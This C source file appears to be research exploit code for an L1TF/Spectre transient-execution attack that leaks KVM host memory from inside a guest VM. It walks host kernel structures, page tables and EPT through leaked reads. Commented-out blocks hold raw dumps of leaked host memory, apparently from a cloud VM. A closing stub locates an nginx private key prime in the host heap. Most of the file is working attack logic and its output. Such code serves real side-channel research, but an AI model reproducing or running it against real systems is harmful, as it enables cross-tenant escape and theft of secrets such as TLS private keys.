#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"
#include "benchmark.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>

#define STR(a) STRSTR(a)
#define STRSTR(a) #a
#define dump(x) printf("%20s = %16lx\n", STR(x), x)

#define BITS_MASK(n, m) ( ((1ULL << n) - 1) & (~((1ULL << m) - 1)) )
#define PFN_MASK BITS_MASK(52, 12)
#define BITS(x, n, m) ((x & BITS_MASK(n, m)) >> m)

#define IS_HUGE(pte) (pte & (1ULL << 7))

uint64_t file_read_lx(const char *filename)
{
    char buf[32];
    int fd = open(filename, O_RDONLY); if (fd < 0) { printf("error open %s", filename); exit(1); }
    int rv = read(fd, buf, 32);  if (rv < 0) { printf("error read %s", filename); exit(1); }
    int cv = close(fd); if (cv < 0) { printf("error close %s", filename); exit(1); }
    return strtoull(buf, NULL, 16);
}

static uint64_t file_write_lx(const char *filename, uint64_t uaddr)
{
    char buf[32];
    snprintf(buf, sizeof(buf), "%lx\n", uaddr);
    int fd = open(filename, O_WRONLY); if (fd < 0) { printf("error open %s", filename); exit(1); }
    int rv = write(fd, buf, 32); if (rv < 0) { printf("error write %s", filename); exit(1); }
    int cv = close(fd); if (cv < 0) { printf("error close %s", filename); exit(1); }
    return 0;
}

uintptr_t procfs_get_physaddr(uintptr_t uaddr)
{
    file_write_lx("/proc/preload_time/phys_addr", uaddr);
    return file_read_lx("/proc/preload_time/phys_addr");
}

uintptr_t get_feeling_translate_va(uintptr_t l0, uintptr_t va)
{
	printf("get_feeling_translate_va(l0 = %lx, va = %lx)\n", l0, va);
	// l0 -= hc_direct_map();
	dump(l0);
	uintptr_t pgd_pa = l0 + 8 * BITS(va, 48, 39);
	dump(pgd_pa);
	uintptr_t pgd = hc_read_pa(pgd_pa);
	dump(pgd);

	uintptr_t l1 = pgd & PFN_MASK;
	dump(l1);
	uintptr_t pud_pa = l1 + 8 * BITS(va, 39, 30);
	dump(pud_pa);
	uintptr_t pud = hc_read_pa(pud_pa);
	dump(pud);
	if (IS_HUGE(pud)) {
		uintptr_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		dump(pa);
		printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
		return pa;
	}

	uintptr_t l2 = pud & PFN_MASK;
	dump(l2);
	uintptr_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
	dump(pmd_pa);
	uintptr_t pmd = hc_read_pa(pmd_pa);
	dump(pmd);
	if (IS_HUGE(pmd)) {
		uintptr_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		dump(pa);
		printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
		return pa;
	}

	uintptr_t l3 = pmd & PFN_MASK;
	dump(l3);
	uintptr_t pte_pa = l3 + 8 * BITS(va, 21, 12);
	dump(pte_pa);
	uintptr_t pte = hc_read_pa(pte_pa);
	dump(pte);
	uintptr_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
	dump(pa);
	printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
	return pa;
}

uintptr_t leak_pte(uintptr_t base, uintptr_t pa)
{
	uintptr_t val;
	do {
		for (int i = 0; i < 5; i++)
			l1tf_leak((char *)&val, base, pa, sizeof(uintptr_t));
		printf("leak_pte: %lx\n", val);
	} while (!((val & 0x7ff8000000000ffbULL) == 0x63));
	return val;
}

uintptr_t leak_translation(uintptr_t base, uintptr_t l0_pa, uintptr_t va)
{
	// `l0_pa` is the physical address of the root page table.
	printf("leak_translation(l0_pa = %lx, va = %lx)\n", l0_pa, va);
	assert(l0_pa < HOST_MEMORY_SIZE);
	dump(l0_pa);

	uintptr_t pgd_pa = l0_pa + 8 * BITS(va, 48, 39);
	dump(pgd_pa);
	uintptr_t pgd = leak_pte(base, pgd_pa);
	dump(pgd);

	uintptr_t l1_pa = pgd & PFN_MASK;
	dump(l1_pa);
	uintptr_t pud_pa = l1_pa + 8 * BITS(va, 39, 30);
	dump(pud_pa);
	uintptr_t pud = leak_pte(base, pud_pa);
	dump(pud);
	if (IS_HUGE(pud)) {
		uintptr_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		dump(pa);
		return pa;
	}

	uintptr_t l2_pa = pud & PFN_MASK;
	dump(l2_pa);
	uintptr_t pmd_pa = l2_pa + 8 * BITS(va, 30, 21);
	dump(pmd_pa);
	uintptr_t pmd = leak_pte(base, pmd_pa);
	dump(pmd);
	if (IS_HUGE(pmd)) {
		uintptr_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		dump(pa);
		return pa;
	}

	uintptr_t l3_pa = pmd & PFN_MASK;
	dump(l3_pa);
	uintptr_t pte_pa = l3_pa + 8 * BITS(va, 21, 12);
	dump(pte_pa);
	uintptr_t pte = leak_pte(base, pte_pa);
	dump(pte);
	uintptr_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
	dump(pa);
	return pa;
}

void get_feeling_for_kernel_kvm_data_structures(void)
{
	uintptr_t direct_map = hc_direct_map();
	dump(direct_map);
	uintptr_t base = hc_phys_map_base();
	dump(base);
	uintptr_t base_pa = base - direct_map;
	dump(base_pa);
	printf("\n");

	uintptr_t kvm_apic_map = base - 0x218;
	dump(kvm_apic_map);
	for (int off = 0; off < 0x18; off += 8) {
		printf("kvm_apic_map+%3x = %16lx\n", off, hc_read_va(kvm_apic_map+off));
	}
	printf("kvm_apic_map/xapic_cluster_map =  0\n");
	for (int off = 0x218; off < 0x230; off += 8) {
		printf("kvm_apic_map+%3x = %16lx\n", off, hc_read_va(kvm_apic_map+off));
	}
	printf("\n");

	uintptr_t kvm_lapic[2];
	for (int i = 0; i < 2; i++) {
		kvm_lapic[i] = hc_read_va(base + i*8); // kvm_apic_map's phys_map[i]
		dump(kvm_lapic[i]);
		for (int off = 0; off < 0x100; off += 8) {
			printf("kvm_lapic[%d]+%3x = %16lx\n", i, off, hc_read_va(kvm_lapic[i] + off));
		}
		printf("\n");
	}

	uintptr_t kvm_vcpu = hc_read_va(kvm_lapic[0]+0x90); // kvm_lapic's vcpu
	dump(kvm_vcpu);
	for (int off = 0; off < 0x90; off += 8) {
		printf("kvm_vcpu+%3x = %16lx\n", off, hc_read_va(kvm_vcpu+off));
	}
	printf("\n");

	uintptr_t pid = hc_read_va(kvm_vcpu+0x78); // kvm_vcpu's pid
	dump(pid);
	for (int off = 0; off < 0x40; off += 8) {
		printf("pid+%3x = %16lx\n", off, hc_read_va(pid+off));
	}
	printf("\n");

	uintptr_t task_struct = hc_read_va(pid+0x20) - 0xa40; // pid's tasks[0], pointing to task_struct's pid_links[0]
	dump(task_struct);
	for (int off = 0; off < 0x80; off += 8) {
		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	printf("...\n");
	for (int off = 0x900-0x40; off < 0x900+0xb0; off += 8) {
		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	printf("...\n");
	for (int off = 0x9d0-0x20; off < 0x9d0+0x20; off += 8) {
		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	printf("...\n");
	for (int off = 0xbf0-0x40; off < 0xbf0+0x40; off += 8) {
		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	printf("\n");

	// Don't start with our own thread, as it may not be the thread group's
	// leader, and hence not be itself linked into the task-list.
	task_struct = hc_read_va(task_struct + 0x908) - 0x900; // task_struct's tasks.prev

	int nr_processes = 0;
	uintptr_t start = task_struct;
	do {
		int pidd = (int)hc_read_va(task_struct + 0x9d0); // task_struct's pid
		int tgid = (int)hc_read_va(task_struct + 0x9d4); // task_struct's tgid
		char comm[16];
		*(uint64_t *)comm = hc_read_va(task_struct + 0xbf0);
		*(uint64_t *)&comm[8] = hc_read_va(task_struct + 0xbf0 + 8);
		if (0) printf("task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);

		nr_processes++;
		task_struct = hc_read_va(task_struct + 0x900) - 0x900; // task_struct's tasks.next
	} while (task_struct != start);
	printf("nr_processes: %d\n\n", nr_processes);

	#define KVM_MID 0x8b8 // 0x1178
	#define KVM_RAD 0x20
	uintptr_t kvm = hc_read_va(kvm_vcpu);
	dump(kvm);
	dump(hc_translate_va(kvm));
	for (int off = KVM_MID-KVM_RAD; off < KVM_MID+KVM_RAD; off += 8) {
		printf("kvm+%3x = %16lx\n", off, hc_read_va(kvm+off));
	}
	printf("...\n");
	// for (int off = 0x9b70-0x40; off < 0x9b70+0x40; off += 8) {
	// 	printf("kvm+%3x = %16lx\n", off, hc_read_va(kvm+off));
	// }
	// printf("\n");

	uintptr_t kvm_next = hc_read_va(kvm + 0x1178) - 0x1178;
	dump(kvm_next);
	for (int off = KVM_MID-KVM_RAD; off < KVM_MID+KVM_RAD; off += 8) {
		printf("kvm_next+%3x = %16lx\n", off, hc_read_va(kvm_next+off));
	}
	printf("\n");

	uintptr_t kvm_prev = hc_read_va(kvm + 0x1178+8) - 0x1178;
	dump(kvm_prev);
	for (int off = KVM_MID-KVM_RAD; off < KVM_MID+KVM_RAD; off += 8) {
		printf("kvm_prev+%3x = %16lx\n", off, hc_read_va(kvm_prev+off));
	}
	printf("\n");

	uintptr_t mm_struct = hc_read_va(task_struct+0x950);
	dump(mm_struct);
	for (int off = 0; off < 0xc0; off += 8) {
		printf("mm_struct+%3x = %16lx\n", off, hc_read_va(mm_struct+off));
	}
	printf("\n");

	uintptr_t pgd = hc_read_va(mm_struct+0x78);
	dump(pgd);
	for (int off = 0xfc0; off < 0x1000; off += 8) {
		printf("pgd+%3x = %16lx\n", off, hc_read_va(pgd+off));
	}
	printf("\n");

	get_feeling_translate_va(pgd, 0xffffffffc1119c78);
	get_feeling_translate_va(pgd, direct_map+0x1234 + (10UL << 30));

	uintptr_t kvm_arch = kvm + 0x12a0;
	dump(kvm_arch);
	for (int off = 0x1178-0x20; off < 0x1178+0x20; off += 8) {
		printf("kvm_arch+%3x = %16lx\n", off, hc_read_va(kvm_arch+off));
	}
	printf("\n");
	uintptr_t after_kvm_vcpu = kvm_vcpu + 0x19d8;
	dump(after_kvm_vcpu);
	for (int off = 0; off < 0x100; off += 8) {
		printf("after_kvm_vcpu+%3x = %16lx\n", off, hc_read_va(after_kvm_vcpu+off));
	}
	printf("\n");

	uintptr_t vmcs01 = kvm_vcpu + 0x1a28;
	dump(vmcs01);
	uintptr_t loaded_vmcs = kvm_vcpu + 0x1ac8;
	dump(loaded_vmcs);
	dump(hc_read_va(loaded_vmcs));
	printf("\n");

	uintptr_t vmcs = hc_read_va(vmcs01);
	dump(vmcs);
	for (int off = 0; off < 0x100; off += 8) {
		printf("vmcs+%3x = %16lx\n", off, hc_read_va(vmcs+off));
	}
	printf("\n");


	// Finding EPTP:
	// 	u64 root_hpa = vcpu->arch.mmu->root.hpa;

	uintptr_t kvm_vcpu_arch = kvm_vcpu + 0x120;
	uintptr_t mmu = kvm_vcpu_arch + 0x168;
	dump(mmu);
	for (int off = -0x40; off < 0x40; off += 8) {
		printf("mmu+%3x = %16lx\n", off, hc_read_va(mmu+off));
	}
	printf("\n");

	uintptr_t kvm_mmu = hc_read_va(mmu);
	dump(kvm_mmu);
	for (int off = 0; off < 0x80; off += 8) {
		printf("kvm_mmu+%3x = %16lx\n", off, hc_read_va(kvm_mmu+off));
	}
	printf("\n");

	uintptr_t hpa = hc_read_va(kvm_mmu + 0x38);
	dump(hpa);
	printf("hpa is the EPTP without the flags, i.e. the phsyical address of EPT PML4\n");
	printf("\n");

	uintptr_t ept_l0 = hc_read_pa(hpa);
	dump(ept_l0);
	ept_l0 &= PFN_MASK;
	dump(ept_l0);
	for (int off = 0; off < 0x60; off += 8) {
		printf("ept_l0+%3x = %16lx\n", off, hc_read_pa(ept_l0+off));
	}
	printf("\n");

	uintptr_t ept_l1 = hc_read_pa(ept_l0+5*8);
	dump(ept_l1);
	ept_l1 &= PFN_MASK;
	dump(ept_l1);
	for (int off = 0; off < 0x60; off += 8) {
		printf("ept_l1+%3x = %16lx\n", off, hc_read_pa(ept_l1+off));
	}
	printf("\n");

	uintptr_t ept_l2 = hc_read_pa(ept_l1+9*8);
	dump(ept_l2);
	ept_l2 &= PFN_MASK;
	dump(ept_l2);
	for (int off = 0x7f0; off < 0x830; off += 8) {
		printf("ept_l2+%3x = %16lx\n", off, hc_read_pa(ept_l2+off));
	}
	printf("\n");

	uintptr_t ept_l3 = hc_read_pa(ept_l2+0x800);
	dump(ept_l3);
	ept_l3 &= PFN_MASK;
	dump(ept_l3);
	for (int off = 0; off < 0x40; off += 8) {
		printf("ept_l3+%3x = %16lx\n", off, hc_read_pa(ept_l3+off));
	}
	printf("\n");

	uintptr_t va = (0x5ULL << 30) | (0x9ULL << 21);
	get_feeling_translate_va(hpa, va);

	void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
	assert(p != MAP_FAILED);
	memset(p, 0x97, 0x1000);
	uintptr_t p_va = (uintptr_t)p;
	uintptr_t p_pa = procfs_get_physaddr(p_va);
	uintptr_t p_hpa = get_feeling_translate_va(hpa, p_pa);
	dump(p_va);
	dump(p_pa);
	dump(p_hpa);
	dump(hc_read_pa(p_hpa));
}

void reverse_host_kernel_data_structures(void)
{
        // Results below were gathered on rain-vm-gce.

	uintptr_t base = 0x88d43f218;
	
	uintptr_t direct_map = 0xffff934040000000;

	// uintptr_t kvm_lapic = 0xffff9348e6de5e00;


	// printf("kvm_lapic:\n");
	// for (int off = 0; off <= 0xc0; off += 0x40) {
	// 	char *data = thijs_l1tf_leak(base, kvm_lapic-direct_map+off, 0x40);
	// 	display_data(data);
	// }
	// 	kvm_lapic:
	//         fee00000 ffffffff84615f70
	// ffff9348e6de5e10                0
	//                0    3d9822bcd52e0
	//    3d9822bcd52e0 ffffffff83785250
	// ffff939eff5a8140          1000000
	//            f2cf0    3d99f36f3f919
	//    2000000000000    5a8ebfbf27dce
	//                0              695
	// 8000000000000000        100000000
	//               10 ffff9352eff70e40 <-- should be kvm_lapic's vcpu, at 0x88
	//        100000101         ffffffff
	// ffff934164541000                0
	//                0                0
	//                0                0
	//                0                0
	//        600000000                0


	// uintptr_t kvm_vcpu = *(uintptr_t *)&data[8]; // *(kvm_lapic+0x88)
	// uintptr_t kvm_vcpu = 0xffff9352eff70e40; // *(kvm_lapic+0x88)
	// printf("kvm_vcpu:\n");
	// for (int off = 0; off <= 0xc0; off += 0x40) {
	// 	char *data = thijs_l1tf_leak(base, kvm_vcpu-direct_map+off, 0x40);
	// 	display_data(data);
	// }
	// kvm_vcpu:
	// ffff9584f2d71000 ffff934228163610
	// ffff936a91dba828 ffffffff8555d368
	//               38        100000000
	//                1                0
	//                f         ffffffff
	// ffff9352eff70e90 ffff9352eff70e90
	// ffff936a91dba000          f000000
	// ffff9352eff70eb0 ffff9352eff70eb0
	// ffff9341b74fe000                0
	// ffff93416434bc00          f000000  <--- left one
	//                0                0
	//                0        100000001
	// kvm_vcpu:
	// ffff9584f2d71000 ffff934228163610
	// ffff936a91dba828 ffffffff8555d368
	//               38        100000000
	//                1                0
	//                0         ffffffff
	// ffff9352eff70e90 ffff9352eff70e90
	// ffff936a91dba000                0
	// ffff9352eff70eb0 ffff9352eff70eb0
	// ffff9341b74fe000                0
	// ffff93416434bc00                0  <--- left one
	//                0                0
	//                0        100000000
	//                1               10
	//  ff09300003010e0                1
	//                0                0
	//        f00000000                0



	// uintptr_t pid = *(uintptr_t *)&data[0x10]; // *(kvm_vcpu+0x90)
	// uintptr_t pid = 0xffff93416434bc00; // *(kvm_vcpu+0x90)
	// printf("pid:\n");
	// char *data = thijs_l1tf_leak(base, pid-direct_map, 0x40);
	// display_data(data);
	// pid:
	//                e                0
	// ffff936a91dbaa78                0 <--- left one
	//  f00000000000000                0
	// ffff93dbd8e25a30                0
	// pid:
	//                e    f000000000000
	// ffff936a91dbaa78      f0000000000
	//              f00  f00000000000f00
	// ffff93fade8bcadf                0
	// pid:
	//    f0000000f000e                0
	// ffff936a91dbaa78          f000000
	//                0                0
	// ffff93da0e0bcad0                0
	// pid:
	//                e                0
	// ffff936a91dbaa78                0
	//                0                0
	// ffff93d4de463828                0

	// struct task_struct {
	// 	+ 64	static_prio
	// 	+ 68	normal_prio
	// 	+ 6c	rt_priority
	// 	+900	tasks
	// 	+a78	pid_links
	// 	+c38	comm
	// }
	// uintptr_t task_struct = *(uintptr_t *)&data[0x10] - 0xa78; // *(pid+0x10)
	// uintptr_t task_struct = 0xffff936a91dbaa78 - 0xa78; // *(pid+0x10)
	// printf("task_struct:\n");
	// for (int off = 0; off < 0x100; off += 0x40) {
	// 	char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
	// 	display_data(data);
	// }



	// for (int i = 0; i < 20; i++) {
	// 	// uintptr_t task_struct = *(uintptr_t *)&data[0x10] - 0xa40; // *(pid+0x10)
	// 	uintptr_t task_struct = (0xffff936a91dbaa78 - 0xa40) & ~63; // *(pid+0x10)
	// 	printf("task_struct+0x8c0:\n");
	// 	for (int off = 0x8c0; off < 0x980; off += 0x40) {
	// 		char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
	// 		display_data(data);
	// 	}
	// }
	// task_struct+0x800:
	//       11cb20dfff    40e097cdf010f
	//                0      f000000a280
	//     e7f088888f27      f000000000f
	//    f000000000000    248be30e15218
	// fffffff08501a440 ffff93416c014a80  <-- hier is task_struct's tasks, op +0x900
	//               8c ffff936a91dba918
	// ffff936a91dba918 ffff936a91dba928
	// ffff936a91dba928 ffff936a91dba938


	// printf("task_struct+c00:\n");
	// for (int off = 0xc00; off < 0xc80; off += 0x40) {
	// 	char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
	// 	display_data(data);
	// }

	// char *comm = thijs_l1tf_leak(base, task_struct-direct_map+0xc38, 0x10);
	// printf("comm = %s\n", comm);


	// char task_struct[0x80];
	// for (int i = 0; i < 11; i++) {
	// 	printf("task_struct+0x900:\n");
	// 	l1tf_leak(task_struct, base, 0xffff936a91dba000-direct_map+0x900, sizeof(task_struct));
	// 	display(task_struct, sizeof(task_struct));
	// }
	// task_struct+0x900:
	//    0:  ffffffff8501a440   40 a4 01 85 ff ff ff ff @.......
	//    8:  ffff93416c014a80   80 4a 01 6c 41 93 ff ff .J.lA...
	//   10:                8c   8c 00 00 00 00 00 00 00 ........
	//   18:  ffff936a91dba918   18 a9 db 91 6a 93 ff ff ....j...
	//   20:  ffff936a91dba918   18 a9 db 91 6a 93 ff ff ....j...
	//   28:  ffff936a91dba928   28 a9 db 91 6a 93 ff ff (...j...
	//   30:  ffff936a91dba928   28 a9 db 91 6a 93 ff ff (...j...
	//   38:  ffff936a91dba938   38 a9 db 91 6a 93 ff ff 8...j...
	//   40:                 0   00 00 00 00 00 00 00 00 ........
	//   48:                 0   00 00 00 00 00 00 00 00 ........
	//   50:  ffff9342868f2000   00 20 8f 86 42 93 ff ff . ..B... <-- struct mm_struct *mm
	//   58:  ffff9342868f2000   00 20 8f 86 42 93 ff ff . ..B... <-- struct mm_struct *active_mm
	//   60:                 0   00 00 00 00 00 00 00 00 ........
	//   68:             f376a   6a 37 0f 00 00 00 00 00 j7......
	//   70:  ffff93428823e988   88 e9 23 88 42 93 ff ff ..#.B...
	//   78:                 0   00 00 00 00 00 00 00 00 ........

	// uintptr_t mm = 0xffff9342868f2000; // task_struct+0x950
	// char mm_struct[0x70];
	// for (int i = 0; i < 11; i++) {
	// 	printf("mm_struct+0x40:\n");
	// 	l1tf_leak(mm_struct, base, mm-direct_map+0x40, sizeof(mm_struct));
	// 	display(mm_struct, sizeof(mm_struct));
	// }
	// mm_struct+0x40:
	//    0:                 1   01 00 00 00 00 00 00 00 ........
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:          ffffe000   00 e0 ff ff 00 00 00 00 ........
	//   18:          555a1000   00 10 5a 55 00 00 00 00 ..ZU....
	//   20:          f7fb2000   00 20 fb f7 00 00 00 00 . ......
	//   28:                 1   01 00 00 00 00 00 00 00 ........
	//   30:      7ffffffff000   00 f0 ff ff ff 7f 00 00 ........
	//   38:      7ffda0b1c000   00 c0 b1 a0 fd 7f 00 00 ........
	//   40:  ffff934151cf6000   00 60 cf 51 41 93 ff ff .`.QA...
	//   48:                c2   c2 00 00 00 00 00 00 00 ........
	//   50:                 0   00 00 00 00 00 00 00 00 ........
	//   58:                 0   00 00 00 00 00 00 00 00 ........
	//   60:                 0   00 00 00 00 00 00 00 00 ........
	//   68:                 0   00 00 00 00 00 00 00 00 ........


	// uintptr_t pgd = 0xffff934151cf6000; // mm_struct+0x80
	// char pgd_data[0x40];
	// for (int i = 0; i < 11; i++) {
	// 	printf("pgd+0xfc0:\n");
	// 	l1tf_leak(pgd_data, base, pgd-direct_map+0xfc0, sizeof(pgd_data));
	// 	display(pgd_data, sizeof(pgd_data));
	// }
	// pgd+0xfc0:
	//    0:                 0   00 00 00 00 00 00 00 00 ........
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:                 0   00 00 00 00 00 00 00 00 ........
	//   18:                 0   00 00 00 00 00 00 00 00 ........
	//   20:        c03ffd0067   67 00 fd 3f c0 00 00 00 g..?....
	//   28:                 0   00 00 00 00 00 00 00 00 ........
	//   38:        c034a13067   67 30 a1 34 c0 00 00 00 g0.4....

	// uintptr_t kvm = 0xffff9584f2d71000;
	// uintptr_t kvm_pa = leak_translation(base, pgd-direct_map, kvm);
	// leak_translation(l0_pa = 111cf6000, va = ffff9584f2d71000)
	//                l0_pa =        111cf6000
	//               pgd_pa =        111cf6958
	// leak_pte: 100000067
	//                  pgd =        100000067
	//                l1_pa =        100000000
	//               pud_pa =        100000098
	// leak_pte: 100263067
	//                  pud =        100263067
	//                l2_pa =        100263000
	//               pmd_pa =        100263cb0
	// leak_pte: 6057fbd067
	//                  pmd =       6057fbd067
	//                l3_pa =       6057fbd000
	//               pte_pa =       6057fbdb88
	// leak_pte: 800000013354d063
	//                  pte = 800000013354d063
	//                   pa =        13354d000
	uintptr_t kvm_pa = 0x13354d000;


// =============================================================================


	// #define N 64
	// for (int i = 0; i < N/8; i++)
	// 	*((uint64_t *)p + i) = 0x0123456789abcdef;
	// half_spectre_start(base, pa);
	// l1tf_do_leak(pa, N);
	// half_spectre_stop();

	// spectre_touch_base_start();
	// l1tf_do_leak(base, 0x10);
	// spectre_touch_base_stop();

	// @base: 00 5e de e6 48 93 ff ff 00 5d de e6 48 93 ff ff
	// phys_map[0] = ffff9348e6de5e00 = 0xffff9348c | 0x26de5e00
	// phys_map[1] = ffff9348e6de5d00 = 0xffff9348c | 0x26de5d00
	// base = 0x88d43f218 = 0x88 | 0x0d43f218

	// Assuming ffff9348e6de5d00 <-> 0x8a6de5d00, i.e. page_offset_base = 0xffff934040000000
	// *phys_map[0] = ffffffff84615070
	// *phys_map[1] = ffffffff84615f70

	// Continously leaking 16 bytes from physcial address 0x88d441200:
	// [sibling] starting half_spectre with idx = 3fd
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a 
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a


	// for (uintptr_t high = 0x88; high >= 0x80; high--) {
	// 	uintptr_t pa_target = (high << 28) | 0x26de5e00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// 	pa_target = (high << 28) | 0x26de5d00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// }


	// uintptr_t direct_map = 0xffff934040000000;

	// uintptr_t pa_target = 0xffffffff84615f70 - direct_map; // == 0x6cbf44615f70 == 108.7TB...
	// half_spectre_start(base, pa_target);
	// l1tf_do_leak(pa_target, 0x18);
	// half_spectre_stop();


	// Leaked 0xc0 bytes at direct map adddress 0xffff9348e6de5e00, i.e. pa (0xffff9348e6de5e00-0xffff934040000000)
}

void reverse_nginx(void)
{
	// At offset 0x008b9a2 from the start of the heap of nginx lies the first prime of the private key. (nginx master process)
}
